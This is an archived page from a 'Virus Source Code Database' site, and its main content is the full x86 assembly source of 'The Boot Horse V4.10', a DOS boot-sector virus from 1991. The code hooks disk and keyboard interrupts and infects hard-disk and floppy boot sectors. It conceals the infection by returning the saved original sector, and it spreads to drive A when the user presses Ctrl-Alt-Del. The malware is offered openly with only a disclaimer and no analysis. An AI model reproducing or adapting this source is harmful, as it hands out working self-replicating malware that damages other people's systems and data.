<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: horsb410_asm</title>
<meta name="KEYWORDS" content="horsb410.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for horsb410.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="hack-83_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hack-83_asm.php">hack-83_asm</a><br>
<a href="hack_res_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hack_res_asm.php">hack_res_asm</a><br>
<a href="hack-res_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hack-res_asm.php">hack-res_asm</a><br>
<a href="hacktc2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hacktc2_asm.php">hacktc2_asm</a><br>
<a href="hacktic2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hacktic2_asm.php">hacktic2_asm</a><br>
<a href="hacktic__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hacktic__asm.php">hacktic__asm</a><br>
<a href="hacktic_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hacktic_asm.php">hacktic_asm</a><br>
<a href="hacktic_bat.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hacktic_bat.php">hacktic_bat</a><br>
<a href="halechen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/halechen_asm.php">halechen_asm</a><br>
<a href="hamster_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hamster_asm.php">hamster_asm</a><br>
<a href="hamtlite_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hamtlite_asm.php">hamtlite_asm</a><br>
<a href="hanm2249_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2249_asm.php">hanm2249_asm</a><br>
<a href="hanm2314_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2314_asm.php">hanm2314_asm</a><br>
<a href="hanm2350_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2350_asm.php">hanm2350_asm</a><br>
<a href="hanm2400_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2400_asm.php">hanm2400_asm</a><br>
<a href="hanm2449_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2449_asm.php">hanm2449_asm</a><br>
<a href="hanm2467_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2467_asm.php">hanm2467_asm</a><br>
<a href="hanm2471_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2471_asm.php">hanm2471_asm</a><br>
<a href="hanm2501_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2501_asm.php">hanm2501_asm</a><br>
<a href="hanm2564_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2564_asm.php">hanm2564_asm</a><br>
<a href="hanm2567_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2567_asm.php">hanm2567_asm</a><br>
<a href="hanm2592_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2592_asm.php">hanm2592_asm</a><br>
<a href="hanm2602_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2602_asm.php">hanm2602_asm</a><br>
<a href="hanm2626_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2626_asm.php">hanm2626_asm</a><br>
<a href="hanm2714_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2714_asm.php">hanm2714_asm</a><br>
<a href="hanm2715_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2715_asm.php">hanm2715_asm</a><br>
<a href="hanm2848_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hanm2848_asm.php">hanm2848_asm</a><br>
<a href="happynyb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/happynyb_asm.php">happynyb_asm</a><br>
<a href="harakiri_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/harakiri_pas.php">harakiri_pas</a><br>
<a href="hate_213_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hate_213_asm.php">hate_213_asm</a><br>
<a href="hate-213_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hate-213_asm.php">hate-213_asm</a><br>
<a href="hause_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hause_asm.php">hause_asm</a><br>
<a href="havoc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/havoc_asm.php">havoc_asm</a><br>
<a href="hcktic2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hcktic2_asm.php">hcktic2_asm</a><br>
<a href="header_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/header_asm.php">header_asm</a><br>
<a href="heeva_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/heeva_asm.php">heeva_asm</a><br>
<a href="heevahav_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/heevahav_asm.php">heevahav_asm</a><br>
<a href="hellowen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hellowen_asm.php">hellowen_asm</a><br>
<a href="hemlock_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hemlock_asm.php">hemlock_asm</a><br>
<a href="hh_h_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hh_h_asm.php">hh_h_asm</a><br>
<a href="hh&amp;h__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hh&h__asm.php">hh&h__asm</a><br>
<a href="hh&amp;h_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hh&h_asm.php">hh&h_asm</a><br>
<a href="hianmit_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hianmit_asm.php">hianmit_asm</a><br>
<a href="hidos_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hidos_asm.php">hidos_asm</a><br>
<a href="highland_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/highland_asm.php">highland_asm</a><br>
<a href="hiperion_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hiperion_asm.php">hiperion_asm</a><br>
<a href="hitler_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hitler_asm.php">hitler_asm</a><br>
<a href="hiv__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hiv__asm.php">hiv__asm</a><br>
<a href="hiv_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hiv_asm.php">hiv_asm</a><br>
<a href="hiv-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hiv-b_asm.php">hiv-b_asm</a><br>
<a href="homecmng_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/homecmng_asm.php">homecmng_asm</a><br>
<a href="horns_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horns_asm.php">horns_asm</a><br>
<a href="horsb410_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horsb410_asm.php">horsb410_asm</a><br>
<a href="horsboo1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horsboo1_asm.php">horsboo1_asm</a><br>
<a href="horsboo3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horsboo3_asm.php">horsboo3_asm</a><br>
<a href="horse2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horse2_asm.php">horse2_asm</a><br>
<a href="horse5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horse5_asm.php">horse5_asm</a><br>
<a href="horse8_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horse8_asm.php">horse8_asm</a><br>
<a href="horse__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horse__asm.php">horse__asm</a><br>
<a href="horse_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/horse_asm.php">horse_asm</a><br>
<a href="howard__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/howard__asm.php">howard__asm</a><br>
<a href="howard_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/howard_asm.php">howard_asm</a><br>
<a href="hspawn__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hspawn__asm.php">hspawn__asm</a><br>
<a href="hspawn_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hspawn_asm.php">hspawn_asm</a><br>
<a href="htc_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/htc_pas.php">htc_pas</a><br>
<a href="humgree__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/humgree__asm.php">humgree__asm</a><br>
<a href="humgreed_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/humgreed_asm.php">humgreed_asm</a><br>
<a href="hydra_0_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_0_asm.php">hydra_0_asm</a><br>
<a href="hydra-0_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-0_asm.php">hydra-0_asm</a><br>
<a href="hydra_1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_1_asm.php">hydra_1_asm</a><br>
<a href="hydra-1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-1_asm.php">hydra-1_asm</a><br>
<a href="hydra_2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_2_asm.php">hydra_2_asm</a><br>
<a href="hydra-2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-2_asm.php">hydra-2_asm</a><br>
<a href="hydra2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra2_asm.php">hydra2_asm</a><br>
<a href="hydra_3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_3_asm.php">hydra_3_asm</a><br>
<a href="hydra-3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-3_asm.php">hydra-3_asm</a><br>
<a href="hydra3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra3_asm.php">hydra3_asm</a><br>
<a href="hydra_4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_4_asm.php">hydra_4_asm</a><br>
<a href="hydra-4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-4_asm.php">hydra-4_asm</a><br>
<a href="hydra_5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_5_asm.php">hydra_5_asm</a><br>
<a href="hydra-5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-5_asm.php">hydra-5_asm</a><br>
<a href="hydra_6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_6_asm.php">hydra_6_asm</a><br>
<a href="hydra-6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-6_asm.php">hydra-6_asm</a><br>
<a href="hydra_7_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_7_asm.php">hydra_7_asm</a><br>
<a href="hydra-7_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-7_asm.php">hydra-7_asm</a><br>
<a href="hydra_8_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra_8_asm.php">hydra_8_asm</a><br>
<a href="hydra-8_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra-8_asm.php">hydra-8_asm</a><br>
<a href="hydra8_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/hydra8_asm.php">hydra8_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

	.radix 16
	;******************************************
	;                                         *
	;       Code masters LTD. presents:       *
	;         THE BOOT HORSE V4.10            *
	;     Finished on the 25.04.1991.         *
	; This is a boot virus,which does not     *
	; "cuts" memory.It places itself into the *
	; second part of the interrupt table.If   *
	; it is resident you will not be able to  *
	; see the infected boot sector.If you     *
	; press CTRL-ALT-DEL & INT 13h had not    *
	; been changed,drive A: will be infected. *
	; It shows you the message 'Brr...!' with *
	; possibility 1/16.                       *
	;                        Good luck!       *
	;******************************************
Start:
	cld		;clear direction
	xor	ax,ax	;clear ax
	mov	bp,7c00 ;bp=7c00
	mov	ds,ax	;ds=ax=0
	mov	ss,ax	;ss=ax=0
	mov	sp,bp	;sp=bp=7c00
	push	ax	;save abs. addr. 0000:7c00 in stack for retf
	push	bp	;
	xor	di,di	;clear di
	les	bx,[di+9*4]	;load es:bx with current int 09h
	mov	word ptr [bp+old9h-Start],bx	;save it in a variable
	mov	word ptr [bp+old9h-Start+2],es
	les	bx,[di+13*4]	;load es:bx with current int 13h
	mov	word ptr [bp+old13h-Start],bx	;save it in a variable
	mov	word ptr [bp+old13h-Start+2],es
	mov	ax,0020 ;ax=20
	mov	[di+9*4],offset int9h-Start	;set int 09h
	mov	[di+9*4+2],ax
	mov	[di+13*4],offset int13h-Start ;set int 13h
	mov	[di+13*4+2],ax
	mov	es,ax		;es=ax=20
	mov	cx,0200 ;will move 512 bytes
	mov	si,bp		;si=bp=7c00
	rep	movsb		;move to 0020:0000 (vectors)
	push	es		;save es&ax for retf
	mov	ax,offset here-Start
	push	ax
	retf			;go to 0020:here-Start
here:
	test	byte ptr [046C],0F	;show a message with possibility 1/16
	jnz	dont
	mov	si,offset msg-Start	;si point the message
	mov	cx,endmsg-msg	;strings to show
show_it:
	db	26		;ES:lodsb
	lodsb			;load next char
	mov	ah,0e		;show char
	xor	bh,bh
	int	10		;do it
	loop	show_it ;show next
dont:
	xor	ah,ah		;initialize
	int	13
	mov	es,cx		;es=cx=0
	xchg	ax,di
	inc	ax		;ax=201 =>read one sector.
	mov	bx,bp		;bx=bp=7c00
	inc	cx		;sector 1,cylinder 0.boot sector
	mov	dx,0080 ;dx=0080
	cmp	byte ptr cs:[ident-Start],dl	;if equal=>loading from hdd
	je	hard
	push	dx		;save dx
	xor	dl,dl		;drive A:
	push	ax		;save ax
	int	13		;read old bootsector from diskette
	pop	ax		;restore ax=201,read one sector
	pop	dx		;drive C:
	mov	bx,0600 ;bx=600
	call	ojoj		;read hdd's boot sector
	jc	goout		;no hdd installed
	call	check		;infected?
	je	goout		;yes ->out!
	mov	ax,0301 ;write one sector (save old)
	push	ax	;save ax
	mov	cx,0004 ;sector 4,cylinder 0
	int	13		;do it
	mov	byte ptr cs:[ident-Start],dl ;set identificator
	push	cs		;es=cs
	pop	es
	mov	si,07BE ;
	mov	di,01BE ;        copy old partition
	mov	cx,64d		;
	rep	movsb		;
	pop	ax		;Write one sector,ax=301
	xor	bx,bx		;from addr ES:BX,bx=0 =>write virus
	inc	cx		;sector 1,cylinder 0.Boot sector.
hard:
	int	13		;do it
goout:
	mov	byte ptr cs:[ident-Start],0	;set ident
	retf					;go to 0000:7c00
int13h:
			;save ax,ds
	push	ax
	push	ds
	cmp	ah,02	;function read?
	jne	skip
	cmp	dl,80	;drive A,B or C?
	ja	skip
	cmp	cx,0001 ;
	jne	notboot ;gonna read bootsector?
	or	dh,dh	;
	jnz	notboot ;
	pop	ds	;restore ax,ds
	pop	ax
	call	ojoj	;execute the task
	jc	all	;if error then no sence
	pushf		;save some registers
	push	ax
	push	cx
	push	dx
	call	check	;infected?
	jne	notnow
	mov	ax,0201
	inc	cx	;if so then make some tricks
	inc	cx	;sector 3,cylinder 0
	inc	dh	;side 1
	test	dl,80	;hdd?
	je	dolie	;if not then
	inc	cx	;sector 4,cylinder 0
	dec	dh	;side 0
dolie:
	call	ojoj	;read boot
notnow:
	pop	dx	;restore registers
	pop	cx
	pop	ax
	popf
all:
;       retf    0002    ;return to caller
db	0ca,2,0
notboot:
	test	dl,80	;drive=C?
	jne	skip	;if so =>out!
	xor	ax,ax	;clear ax
	mov	ds,ax	;ds=ax=0
	mov	al,byte ptr [043F] ;this byte shows whether the motor is active
	push	dx	;save dx
	inc	dl	;adjust dl
	test	al,dl	;check if the motor is active.
	pop	dx	;restore dx
	jnz	skip	;if so =>leave
	call	infect	;infect it
skip:
	pop	ds	;restore flags,ax,ds
	pop	ax
do:
		db	0EAh	;go to the original int 13h
	old13h	dd	000h	;JMP XXXX:XXXX
infect:
	push	bx	;save some registers
	push	cx
	push	dx
	push	es
	mov	ax,0201 ;will read 1 sector
	mov	cx,0001 ;sector 1,cylinder 0
	xor	dh,dh	;side 0
	call	ojoj	;do it
	jc	leave	;on error...
	mov	byte ptr cs:[count-Start],36d	;load counter
	call	check	;infected?
	je	leave	;leave if so.
	mov	ax,0301 ;write one sector
	inc	cx	;sector 3,cylinder 0
	inc	cx
	inc	dh	;side   1
	push	ax	;save   ax
	call	ojoj	;do write (save old bootsector)
	pop	ax	;restore ax
	jc	leave	;write protected
	push	cs	;es=cs
	pop	es
	xor	bx,bx	;write virus
	dec	cx	;make cx=1
	dec	cx	;sector 1,cylinder 0
	dec	dh	;side 0
	call	ojoj	;that's it!
leave:
	pop	es	;restore registers
	pop	dx
	pop	cx
	pop	bx
	ret		;return
ojoj:
	pushf		;this   calles the original int 13h
	push	cs
	call	do
	ret
check:
	cmp	es:[bx],31FCh	;this checks the first 2 bytes
	ret			;to understand if the disk is infected
int9h:
	push	ax		;the keybord interrupt.save AX
	mov	ah,02		;check  if ctrl-alt is pressed
	int	16		;
	test	al,00001100b	;if not =>exit
	jz	exit
	in	al,60		;is del pressed?
	cmp	al,53
	je	cont		;if so...
exit:
	pop	ax		;restore ax
		db	0EAh	;go to the old int 09h
	old9h	dd	000h	;JMP XXXX:XXXX
cont:
	mov	al,20		;free interrupts
	out	20,al		;do it
	mov	ax,0003 ;clear screen
	int	10		;do it
	mov	dx,03D8 ;chose video port
	mov	al,04		;video flag
	out	dx,al		;no video
	mov	ax,0060 ;es=60
	mov	es,ax		;
	xor	bx,bx		;drive A
	xor	dl,dl		;bx=0
	mov	ds,bx		;dx=bx=0
	mov	byte ptr cs:[count-Start],18d ;load counter to 1 sec.
	cli				;set int 1ch
	mov	[bx+1c*4],offset int1ch-Start
	mov	[bx+1c*4+2],cs
	sti
	cmp	[bx+13*4],offset int13h-Start ;is int 13h changed?
	jne	reset			;if so reset computer
	call	infect			;infect disk in drive A
reset:
	xor	bx,bx
	mov	ds,bx			;don't count memory !
	mov	[bx+0472],1234
;       JMP     FFFF:0000               ;Reset
db	0ea,00,00,0ff,0ff
int1ch:
	dec	byte ptr cs:[count-Start]	;decrease counter
	jz	reset			;if zero then reset
	iret				;otherwise continue
msg		db	'Brr...!',7,0a,0dh, ;message
endmsg		label	word
ident		db	0		;0 for fdd,80 for hdd
count		label	byte
partition	db	64d	dup (?)
bootident	dw	0AA55
endcode label word


</textarea></td></tr></table></body></html>
